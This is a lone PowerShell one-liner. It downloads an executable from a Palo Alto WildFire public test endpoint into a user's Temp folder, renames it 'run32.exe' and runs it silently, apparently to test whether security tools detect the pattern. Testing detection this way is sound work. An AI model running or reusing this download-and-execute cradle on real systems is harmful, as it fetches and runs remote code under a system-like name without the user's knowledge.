
$wc=new-object Net.WebClient; $wp=[system.net.WebProxy]::GetDefaultProxy(); $wp.UseDefaultCredentials = $true; $wc.proxy = $wp; $wc.DownloadFile('https://wildfire.paloaltonetworks.com/publicapi/test/pe/', 'C:\Users\N23498\AppData\Local\Temp\run32.exe.tmp'); rename-item 'C:\Users\N23498\AppData\Local\Temp\run32.exe.tmp' 'C:\Users\N23498\AppData\Local\Temp\run32.exe'; Start-Process -FilePath 'C:\Users\N23498\AppData\Local\Temp\run32.exe' -NoNewWindow;

